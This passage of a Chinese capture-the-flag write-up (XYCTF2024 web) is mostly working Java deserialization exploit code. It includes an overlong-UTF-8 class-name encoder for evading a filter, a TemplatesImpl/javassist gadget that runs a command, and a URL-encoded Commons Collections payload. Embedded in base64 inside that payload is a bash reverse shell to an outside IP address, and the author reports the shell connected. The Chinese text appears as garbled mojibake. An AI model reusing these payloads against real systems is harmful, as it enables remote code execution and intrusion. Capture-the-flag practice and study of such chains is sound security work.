class="type">byte</span>[] bytes=<span class="keyword">new</span> <span class="title class_">byte</span>[name.length() * <span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> k=<span class="number">0</span>;</span><br><span class="line">        StringBuffer str=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; name.length(); i++) &#123;</span><br><span class="line">            <span class="type">int</span>[] bs = bytesMap.get(name.charAt(i));</span><br><span class="line">            bytes[k++]= (<span class="type">byte</span>) bs[<span class="number">0</span>];</span><br><span class="line">            bytes[k++]= (<span class="type">byte</span>) bs[<span class="number">1</span>];</span><br><span class="line">            bytes[k++]= (<span class="type">byte</span>) bs[<span class="number">2</span>];</span><br><span class="line">            str.append(Integer.toHexString(bs[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            str.append(Integer.toHexString(bs[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            str.append(Integer.toHexString(bs[<span class="number">2</span>])+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(str.toString());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeShort(name.length() * <span class="number">3</span>);</span><br><span class="line">            write(bytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeClassDescriptor</span><span class="params">(ObjectStreamClass desc)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">externalizable</span> <span class="operator">=</span> (<span class="type">boolean</span>) getFieldValue(desc, <span class="string">&quot;externalizable&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">serializable</span> <span class="operator">=</span> (<span class="type">boolean</span>) getFieldValue(desc, <span class="string">&quot;serializable&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">hasWriteObjectData</span> <span class="operator">=</span> (<span class="type">boolean</span>) getFieldValue(desc, <span class="string">&quot;hasWriteObjectData&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isEnum</span> <span class="operator">=</span> (<span class="type">boolean</span>) getFieldValue(desc, <span class="string">&quot;isEnum&quot;</span>);</span><br><span class="line">        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="string">&quot;fields&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="comment">//å†™å…¥nameï¼ˆjdkåŸç”Ÿå†™å…¥æ–¹æ³•ï¼‰</span></span><br><span class="line"><span class="comment">//        writeUTF(name);</span></span><br><span class="line">        <span class="comment">//å†™å…¥name(ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span></span><br><span class="line"><span class="comment">//        charWritTwoBytes(name);</span></span><br><span class="line">        <span class="comment">//å†™å…¥name(ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span></span><br><span class="line">        charWriteThreeBytes(name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        writeLong(desc.getSerialVersionUID());</span><br><span class="line">        <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (externalizable) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">protocolField</span> <span class="operator">=</span></span><br><span class="line">                    <span class="literal">null</span>;</span><br><span class="line">            <span class="type">int</span> protocol;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                protocolField = ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;protocol&quot;</span>);</span><br><span class="line">                protocolField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                protocol = (<span class="type">int</span>) protocolField.get(<span class="built_in">this</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;</span><br><span class="line">                flags |= ObjectStreamConstants.SC_BLOCK_DATA;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (serializable) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_SERIALIZABLE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (hasWriteObjectData) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_WRITE_METHOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isEnum) &#123;</span><br><span class="line">            flags |= ObjectStreamConstants.SC_ENUM;</span><br><span class="line">        &#125;</span><br><span class="line">        writeByte(flags);</span><br><span class="line"></span><br><span class="line">        writeShort(fields.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[i];</span><br><span class="line">            writeByte(f.getTypeCode());</span><br><span class="line">            writeUTF(f.getName());</span><br><span class="line">            <span class="keyword">if</span> (!f.isPrimitive()) &#123;</span><br><span class="line">                invoke(<span class="built_in">this</span>, <span class="string">&quot;writeTypeString&quot;</span>, f.getTypeString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Object object, String methodName, Object... args)</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">writeTypeString</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);</span><br><span class="line">            writeTypeString.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writeTypeString.invoke(object, args);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            value = field.get(object);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gdufs.challenge.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Utils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getTemplatesImplBase64</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(GenerateEvil()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] GenerateEvil() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clz.getDeclaredField(name);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;GenerateEvil()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        SetValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        SetValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        SetValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">UnSerialize</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(str)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Base64_Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Byte2Hex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">byte</span> b: bytes)&#123;</span><br><span class="line">            builder.append(String.format(<span class="string">&quot;%02X&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(builder.toString());</span><br><span class="line">        <span class="keyword">return</span> builder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hex2Byte(String hexString) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> hexString.length();</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(hexString.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">                    + Character.digit(hexString.charAt(i+<span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload urlç¼–ç ä¸€ä¸‹æ‰“è¿‡å»å°±å¯ä»¥äº†</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=rO0ABXNyADPggarggaHggbbggaHggK7ggbXggbTgganggazggK7ggYjggaHggbPggajggY3ggaHggbAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXNyAJzgga%2FggbLggafggK7ggaHggbDggaHggaPggajggaXggK7ggaPgga%2Fgga3gga3gga%2Fgga7ggbPggK7ggaPgga%2FggazggazggaXggaPggbTggangga%2Fgga7ggbPggK7ggavggaXggbnggbbggaHggazggbXggaXggK7ggZTgganggaXggaTggY3ggaHggbDggYXgga7ggbTggbLggbmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAfuCBr%2BCBsuCBp%2BCAruCBoeCBsOCBoeCBo%2BCBqOCBpeCAruCBo%2BCBr%2BCBreCBreCBr%2BCBruCBs%2BCAruCBo%2BCBr%2BCBrOCBrOCBpeCBo%2BCBtOCBqeCBr%2BCBruCBs%2BCAruCBreCBoeCBsOCAruCBjOCBoeCBuuCBueCBjeCBoeCBsG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgCu4IGv4IGy4IGn4ICu4IGh4IGw4IGh4IGj4IGo4IGl4ICu4IGj4IGv4IGt4IGt4IGv4IGu4IGz4ICu4IGj4IGv4IGs4IGs4IGl4IGj4IG04IGp4IGv4IGu4IGz4ICu4IGm4IG14IGu4IGj4IG04IGv4IGy4IGz4ICu4IGD4IGo4IGh4IGp4IGu4IGl4IGk4IGU4IGy4IGh4IGu4IGz4IGm4IGv4IGy4IGt4IGl4IGyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgCH4IGb4IGM4IGv4IGy4IGn4ICu4IGh4IGw4IGh4IGj4IGo4IGl4ICu4IGj4IGv4IGt4IGt4IGv4IGu4IGz4ICu4IGj4IGv4IGs4IGs4IGl4IGj4IG04IGp4IGv4IGu4IGz4ICu4IGU4IGy4IGh4IGu4IGz4IGm4IGv4IGy4IGt4IGl4IGy4IC7vVYq8dg0GJkCAAB4cAAAAARzcgCx4IGv4IGy4IGn4ICu4IGh4IGw4IGh4IGj4IGo4IGl4ICu4IGj4IGv4IGt4IGt4IGv4IGu4IGz4ICu4IGj4IGv4IGs4IGs4IGl4IGj4IG04IGp4IGv4IGu4IGz4ICu4IGm4IG14IGu4IGj4IG04IGv4IGy4IGz4ICu4IGD4IGv4IGu4IGz4IG04IGh4IGu4IG04IGU4IGy4IGh4IGu4IGz4IGm4IGv4IGy4IGt4IGl4IGyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAM%2BCBquCBoeCBtuCBoeCAruCBrOCBoeCBruCBp%2BCAruCBkuCBteCBruCBtOCBqeCBreCBpQAAAAAAAAAAAAAAeHBzcgCu4IGv4IGy4IGn4ICu4IGh4IGw4IGh4IGj4IGo4IGl4ICu4IGj4IGv4IGt4IGt4IGv4IGu4IGz4ICu4IGj4IGv4IGs4IGs4IGl4IGj4IG04IGp4IGv4IGu4IGz4ICu4IGm4IG14IGu4IGj4IG04IGv4IGy4IGz4ICu4IGJ4IGu4IG24IGv4IGr4IGl4IGy4IGU4IGy4IGh4IGu4IGz4IGm4IGv4IGy4IGt4IGl4IGyh%2Bj%2Fa3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgA54IGb4IGM4IGq4IGh4IG24IGh4ICu4IGs4IGh4IGu4IGn4ICu4IGP4IGi4IGq4IGl4IGj4IG04IC7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1lcHQACWdldE1ldGhvZHVyADbggZvggYzggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggYPggazggaHggbPggbPggLurFteuy81amQIAAHhwAAAAAnZyADDggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggZPggbTggbLggangga7ggaeg8KQ4ejuzQgIAAHhwdnEAfgAcc3EAfgATdXEAfgAYAAAAAnBwdAAGaW52b2tldXEAfgAcAAAAAnZyADDggarggaHggbbggaHggK7ggazggaHgga7ggafggK7ggY%2FggaLggarggaXggaPggbQAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQAXWJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmk5a1pYWXZkR053THpFd05pNDFNaTQ1TkM0eU15OHlNek16SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB%2BABwAAAABcQB%2BAB9zcQB%2BAAA%2FQAAAAAAADHcIAAAAEAAAAAB4eHQAA2JiYng%3D</span><br></pre></td></tr></table></figure>
<img src="/posts/52072/7.png" class title="awa">
<p>shellå¼¹è¿‡æ¥äº†ï¼Œflag is in env</p>
<img src="/posts/52072/8.png" class title="awa">
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">æœ¬ä½œå“é‡‡ç”¨ <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">çŸ¥è¯†å…±äº«ç½²å-ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™…è®¸å¯åè®®</a> è¿›è¡Œè®¸å¯</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> æ‰“èµ</a>
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> åˆ†äº«</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>æ‰“å¼€å¾®ä¿¡â€œæ‰«ä¸€æ‰«â€ï¼Œæ‰“å¼€ç½‘é¡µåç‚¹å‡»å±å¹•å³ä¸Šè§’åˆ†äº«æŒ‰é’®</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://example.com/posts/52072.html",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://example.com/posts/52072.html";
            const title         = "ã€ŒXYCTF2024 Webæ–¹å‘é¢˜è§£ã€";
            const excerpt       = `ä»…ä½œwpè®°å½•ç”¨ï¼Œä¸å®£æ³„ä»»ä½•æƒ…ç»ªï¼Œä»…ä½œçŸ¥è¯†åˆ†äº«`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-04-26T15:17:38.000Z" itemprop="dateModified">æœ€åç¼–è¾‘ï¼š2024-04-26</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" UTF8 Overlong Encodingç»•waf" href="/posts/13739.html">&lt; ä¸Šä¸€ç¯‡</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" è¢«awdé€Ÿé€š(1)" href="/posts/57335.html">ä¸‹ä¸€ç¯‡ &gt;</a>
            </div>
            
        </nav>
    
    
        <div id="v-comments" class="post-comments bg-image"></div>
<script>
    var load_comm = () => {
        const init = () => {
            new Valine({
                el: '#v-comments',
                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                visitor: true,
                enableQQ: false,
                path: '/posts/52072.html'
                
            });
        }
        if (typeof Valine === 'undefined') {
            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
            $.getScript(src, init);
        } else {
            init();
        }
    };
</script>


<script>
<style>
    .v .veditor{min-height: 10rem;
        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
        background-size: contain;
        background-repeat: no-repeat;
        background-position: right;
        background-color: rgba(255,255,255,0);
        resize: none;}
</style>
</script>


    <script>
        new Valine({
            el: '#vcomments',
            lang: 'zh-cn',
            admin_email: '83635877@qq.com',//åšä¸»é‚®ç®±
            appId: "",
            appKey: "",
            path: window.location.pathname,
            comment_count: true,
            //notify: false, // é‚®ä»¶æé†’!ä½¿ç”¨ç¬¬ä¸‰æ–¹å°±ä¸è¦æ·»åŠ è¿™ä¸ª!!
            //verify: true, //éªŒè¯ç 
            avatar: 'monsterid',//å°æ€ªç‰©å¤´åƒ
            placeholder: "qwq~"
        });
        
</script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script type="text/javascript">
        jinrishici.load(function(result) {
